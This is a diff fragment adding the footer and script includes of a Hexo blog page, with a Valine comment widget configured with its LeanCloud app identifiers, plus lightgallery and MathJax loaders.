+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2022 HACHp1<br>
+            Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script src="//unpkg.com/leancloud-storage@3.15.0/dist/av-min.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/valine@1.4.16/dist/Valine.min.js"></script>
+    <script>
+        new Valine({
+            el: '#valine-thread' ,
+            notify:true,
+            verify:true,
+            app_id: 'GpqOpUBld8udMg3PSOCDbYr7-gzGzoHsz',
+            app_key: 'k6nxcdbcy4MrjOq2DssFFljB',
+            placeholder: '少侠，留下几句话，我们喝一壶啊 ヾﾉ≧∀≦)o （支持markdown语句，可插入图片）'
+        });
+    </script>
+
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+    
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });
+        </script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
